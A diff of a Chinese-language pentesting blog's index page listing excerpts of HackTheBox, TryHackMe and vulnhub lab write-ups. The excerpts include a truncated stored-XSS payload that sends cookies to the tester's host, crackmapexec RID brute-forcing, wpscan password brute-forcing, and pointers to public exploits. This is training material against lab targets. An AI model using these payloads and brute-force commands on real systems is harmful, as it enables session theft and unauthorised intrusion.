@@ -267,15 +267,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/04/02/DC-3/" target="_self">
-          DC-3
+        <a href="/2025/02/07/HTB-Heal/" target="_self">
+          HTB-Heal
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/04/02/DC-3/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/02/07/HTB-Heal/" target="_self">
         <div>
-          DC-3信息收集nmap扫描端口信息  开放了80端口 然后去访问，在index.php 可以看到提示信息，以及存在admin用户，可以尝试爆破一下密码 (最终是要获得root权限的)  无果，去扫一下后台  漏洞利用然后看了一下是个CMS 去找一下它的漏洞信息 找到了一个SQL注入类型的 =&gt;https://blog.csdn.net/smli_ng/article/details/115
+          HTB-Heal信息收集扫描端口信息 22和80端口开放。 将域名和对应ip添加到/etc/hosts中   扫下后台  123/index.html/robots.txt/manifest.json  没什么有用的信息。 进行子域名爆破，看是否存在子域名。 1ffuf -w subdomains-top1million-110000.txt -u http://heal.htb/ -H &quo
         </div>
       </a>
 
@@ -283,8 +283,374 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-04-02 13:41" pubdate>
-              2024-04-02
+            <time datetime="2025-02-07 19:34" pubdate>
+              2025-02-07
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux%E9%9D%B6%E6%9C%BA%E4%B8%AD%E7%BA%A7/" class="category-chain-item">Linux靶机中级</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/HTB/">#HTB</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/02/02/HTB-Backfire/" target="_self">
+          HTB-Backfire
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/02/02/HTB-Backfire/" target="_self">
+        <div>
+          HTB-Backfire信息收集8000 22 443端口开启。  访问8000端口 发现有两个文件  漏洞利用下载下来看看 发现是一个Havoc 经过搜索得到一个SSRF的漏洞 参考链接：https://github.com/HimmeL-Byte/CVE-2024-41570-SSRF-RCE 尝试着打一下 发现可以  登录进去之后发现shell并不长久 我们可以通过ssh的公私钥对 进行一个
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-02-02 23:44" pubdate>
+              2025-02-02
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux%E9%9D%B6%E6%9C%BA%E4%B8%AD%E7%BA%A7/" class="category-chain-item">Linux靶机中级</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/HTB/">#HTB</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/02/02/HTB-cat/" target="_self">
+          HTB-cat
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/02/02/HTB-cat/" target="_self">
+        <div>
+          HTB-cat信息收集 22 80端口开放 然后将cat.htb添加到/etc/hosts中 扫描后台 发现git泄露   将git泄露的代码拉下来审计 发现一个xss的  username和email未经过验证就被写进数据库中，这里能写入存储型的xss 获取cookie: 1&lt;script&gt;document.location=&#x27;http://10.10.14.68:8888
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-02-02 23:29" pubdate>
+              2025-02-02
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux%E9%9D%B6%E6%9C%BA%E4%B8%AD%E7%BA%A7/" class="category-chain-item">Linux靶机中级</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/HTB/">#HTB</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/01/25/HTB-Trickster/" target="_self">
+          HTB-Trickster
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/01/25/HTB-Trickster/" target="_self">
+        <div>
+          HTB-Tricksterlinux 中等难度 信息收集端口扫描发现22和80端口开放 访问80端口 发现并不能访问它的服务 做一下映射 将域名添加到/etc/hosts中。    第一个网站扫后台扫到了一个assets 没找到什么有用的信息  第二个网站是一个PrestaSHop 网上搜了大部分是sql注入漏洞  注册一个账户登录进去看看。 没啥东西，扫后台可以知道是一个git泄露 利用GitH
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-01-25 16:25" pubdate>
+              2025-01-25
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Linux%E9%9D%B6%E6%9C%BA%E4%B8%AD%E7%BA%A7/" class="category-chain-item">Linux靶机中级</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/HTB/">#HTB</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/01/17/HTB-Cicada/" target="_self">
+          HTB-Cicada
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/01/17/HTB-Cicada/" target="_self">
+        <div>
+          HTB-Cicada信息收集 端口开放 445 利用smbclient查看一下共享资源。  在HR下 找到一个txt文件 下载下来。  漏洞利用在txt里面得到一个账户默认的密码，但是用户名并不知道，需要枚举。 1crackmapexec smb 10.10.11.35 -u  &quot;guest&quot; -p  &quot; &quot; --rid-brute | grep &quot
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-01-17 22:07" pubdate>
+              2025-01-17
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Windows%E9%9D%B6%E6%9C%BA%E5%88%9D%E7%BA%A7/" class="category-chain-item">Windows靶机初级</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/HTB/">#HTB</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/01/10/ctfshow_%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/" target="_self">
+          ctfshow渗透赛复现
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/01/10/ctfshow_%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/" target="_self">
+        <div>
+          ctfshow渗透赛复现前置：我那时候只做到了第二章，第三章往后的都没做出来，主要是复现3到5章的内容,前两章的大概思路就是通过爆破，可以得到压缩包的密码，然后解一下RSA可以得到网址，账号密码的话，xxx.gxv 那个网站存在一个任意文件下载，通过wpscan api扫出来的 可以下载config.php得到初始的账号密码，然后登录进去，对jwt进行一个爆破，得到密钥，伪造身份，然后就是扫靶机的
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-01-10 17:10" pubdate>
+              2025-01-10
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/" class="category-chain-item">渗透比赛</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">#比赛复现</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/01/02/Empire%20LupinOne/" target="_self">
+          Empire_LupinOne
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2025/01/02/Empire%20LupinOne/" target="_self">
+        <div>
+          Empire: LupinOne信息收集首先扫描存活主机。  得到ip地址为192.168.29.170 然后扫描端口信息，进行服务的访问。  80和22端口开放，没啥特别的漏洞，那就去扫一下后台看是否存在敏感文件。  访问/manual 会跳转到一个Apache HTTP Server Version 2.4 服务的界面。 没找到什么可以利用的漏洞，然后去访问robots.txt  可以看到有一
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-01-02 19:05" pubdate>
+              2025-01-02
             </time>
           </div>
         
@@ -328,15 +694,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/04/06/Jr%20Penetration%20Tester/" target="_self">
-          Pentesting Fundamentals，Principles of Security概念
+        <a href="/2024/12/03/Active%20Directory%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_self">
+          域渗透基础知识
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/04/06/Jr%20Penetration%20Tester/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/12/03/Active%20Directory%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_self">
         <div>
-          Pentesting Fundamentals主要介绍了什么是渗透测试，以及渗透测试的大概流程是怎样的。  以及介绍了一些黑盒，灰盒，白盒测试等。 黑盒测试:测试人员不会获得有关内部工作的任何信息,应用程序或服务，相当于是一个普通用户对这个服务进行渗透，通过对程序的一些交互来进行测试。需要在信息收集和枚举这方面下功夫。 灰盒测试:测试人员对内部工作的消息知道的内容并不多，相当于是白盒和黑盒的结合。
+          Active Directory 基础知识Windows域当一个区域有多台计算机，难以逐个管理时，通常会将这些计算机的通用组件的管理集中在一个被称为Active Directory(AD)的存储库中,运行AD的服务器被称为DC(域控制器) 管理员通过控制AD从而控制其他计算机，并在AD中配置策略应用到网络中。 ADAD中包含很多对象，包括用户，机器，安全组，打印机等。 域中比较重要的安全组：
         </div>
       </a>
 
@@ -344,8 +710,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-04-06 17:18" pubdate>
-              2024-04-06
+            <time datetime="2024-12-03 14:39" pubdate>
+              2024-12-03
             </time>
           </div>
         
@@ -360,7 +726,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Jr-Penetration-Tester/" class="category-chain-item">Jr Penetration Tester</a>
+  <a href="/categories/Offensive-Pentesting/" class="category-chain-item">Offensive Pentesting</a>
   
   
 
@@ -389,15 +755,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/04/07/DC-4/" target="_self">
-          DC-4
+        <a href="/2024/11/28/Internal/" target="_self">
+          Internal
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/04/07/DC-4/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/11/28/Internal/" target="_self">
         <div>
-          DC-4信息收集nmap扫一波   22和80端口开启 先去访问80端口，是一个登录界面，尝试爆破，未果 (还是字典不行啊) 去扫后台也没扫到什么东西  漏洞利用最后发现还得爆破，利用hydra  注意要添加 :S=logout 这个意思就是成功登录后，Hydra将尝试执行登出操作。 进去之后有三个按钮  抓个包看看  反弹个shell  现在还是普通用户的状态，下一步就是要提权了。  提权注意前
+          Internal信息收集：nmap扫一波  22和80端口开放 扫下后台  有一个phpadmin和wordpress的后台登录 使用wpscn扫一下看看情况 1wpscan --url &quot;http://10.10.50.8/blog&quot; -eu   利用wpscan爆破密码 1wpscan --url &quot;http://10.10.50.8/blog&quot; -U
         </div>
       </a>
 
@@ -405,8 +771,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-04-07 10:55" pubdate>
-              2024-04-07
+            <time datetime="2024-11-28 22:45" pubdate>
+              2024-11-28
             </time>
           </div>
         
@@ -421,312 +787,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/vulnhub/">#vulnhub</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/04/07/DC-5/" target="_self">
-          DC-5
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/04/07/DC-5/" target="_self">
-        <div>
-          DC-5信息收集nmap扫描端口信息  开启了80和111端口 1111端口是RPC（Remote Procedure Call，远程过程调用）服务的默认端口。 RPC是一种分布式应用程序框架，可用于在不同的计算机之间传输数据。  漏洞利用先去各个界面看了一下，发现并没有什么实际的内容  想在这进行xss来着，但是不太行。 然后扫了一下后台。  没找到漏洞点。但有一点就是很奇怪  每次刷新的时候这
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-04-07 18:50" pubdate>
-              2024-04-07
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/vulnhub/">#vulnhub</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/04/09/DC-6/" target="_self">
-          DC-6
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/04/09/DC-6/" target="_self">
-        <div>
-          DC-6信息收集nmap扫描一波  可以看到开放了22和80端口 这里的话跟dc-2情况一样，需要去修改/etc/hosts文件 修改DNS配置信息  然后windows下修改是在 1&quot;C:\Windows\System32\drivers\etc\hosts&quot;  这个目录下的hosts文件 它是一个wordpress的cms 版本是5.1.1  利用wpscan可以把用户名给
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-04-09 12:33" pubdate>
-              2024-04-09
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/vulnhub/">#vulnhub</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/04/10/DC-7/" target="_self">
-          DC-7
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/04/10/DC-7/" target="_self">
-        <div>
-          DC-7信息收集 开放了22和80端口  去访问，提示的信息是进行爆破的话可能会失败，要跳出框框思考 考察的是信息收集的能力    ssh远程登录进去  登录成功 去mbox看一下内容  多次提到这个路径，去查看一下  可以使用drush来更改admin的密码 在网站根目录下进行修改密码 修改命令参考:https://zhuanlan.zhihu.com/p/60880048  进行登录 漏洞利用
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-04-10 13:32" pubdate>
-              2024-04-10
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/vulnhub/">#vulnhub</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/04/18/DC-8/" target="_self">
-          DC-8
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/04/18/DC-8/" target="_self">
-        <div>
-          DC-8信息收集nmap扫描一波  可以看到开放了22和80端口 漏洞利用 在这个地方可以试试sql注入，手工发现是存在的。利用sqlmap进行跑。  发现账户密码，这个密码我们利用john进行解密。 admin这个账号没有跑出来，但是john这个账号可以得到密码  进行登录后台  然后经过一番寻找，找到了一个可以写php代码的地方。     这个地方随便填一下，然后去提交，即可执行代码。 进行一
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-04-18 19:58" pubdate>
-              2024-04-18
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/vulnhub/">#vulnhub</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/07/09/Nmap%20%E5%9F%BA%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" target="_self">
-          Nmap 基本端口扫描
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/07/09/Nmap%20%E5%9F%BA%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" target="_self">
-        <div>
-          Nmap 基本端口扫描上面介绍了nmap扫描的前三个步骤，枚举目标，发现存活主机，反向DNS查找。 下面将介绍端口信息的扫描。 Nmap考虑以下六种状态：  Open：表示服务正在监听指定端口。 Closed：表示没有服务在监听指定端口，尽管该端口可以访问。可访问是指该端口可以访问，并且未被防火墙或其他安全设备/程序阻止。 Filtered：表示Nmap无法确定端口是打开还是关闭，因为端口无法访问
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-07-09 09:46" pubdate>
-              2024-07-09
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/Jr-Penetration-Tester/" class="category-chain-item">Jr Penetration Tester</a>
+  <a href="/categories/Offensive-Pentesting/" class="category-chain-item">Offensive Pentesting</a>
   
   
 
@@ -755,15 +816,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/2024/07/09/nmap%E5%AE%9E%E6%97%B6%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8F%91%E7%8E%B0/" target="_self">
-          Nmap Live Host Discovery
+        <a href="/2024/11/08/Daily%20Bugle/" target="_self">
+          Daily Bugle
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/07/09/nmap%E5%AE%9E%E6%97%B6%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8F%91%E7%8E%B0/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/11/08/Daily%20Bugle/" target="_self">
         <div>
-          Nmap Live Host Discovery (nmap实时主机的发现) ARP扫描：此扫描使用ARP请求来发现活动主机 ICMP 扫描：此扫描使用 ICMP 请求来识别活动主机 TCP/ UDP ping 扫描：此扫描将数据包发送到 TCP 端口和UDP端口以确定活动主机。   当在同一网段内的时候 ，可以使用arp-scan来进行扫描，但如果目标主机不再同一网段内，就不能使用arp-sca
+          Daily Bugle扫了一下 22 80 3306端口开启 访问README.txt 可以得到版本号 是3.7.0 找到一个sql注入的洞  用sqlmap可以跑。但还是挺慢的。 但最后没跑出数据。  去找一下这个cve CVE-2017-8917 https://github.com/stefanlucas/Exploit-Joomla 1Found user [u&#x27;811&#x27
         </div>
       </a>
 
@@ -771,8 +832,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-07-09 09:48" pubdate>
-              2024-07-09
+            <time datetime="2024-11-08 20:38" pubdate>
+              2024-11-08
             </time>
           </div>
         
@@ -787,68 +848,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Jr-Penetration-Tester/" class="category-chain-item">Jr Penetration Tester</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/tryhackme/">#tryhackme</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/2024/07/09/%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/" target="_self">
-          Active Reconnaissance
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/2024/07/09/%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/" target="_self">
-        <div>
-          Active Reconnaissance主动侦察 重要的一点就是要被授权！ web浏览器上的一些工具1.FoxyProxy （代理工具） 2.Wappalyzer （收集网站的相关信息） 3.User-Agent Switcher and Manager (伪造User-Agent)
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-07-09 09:50" pubdate>
-              2024-07-09
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/Jr-Penetration-Tester/" class="category-chain-item">Jr Penetration Tester</a>
+  <a href="/categories/Offensive-Pentesting/" class="category-chain-item">Offensive Pentesting</a>
   
   
 
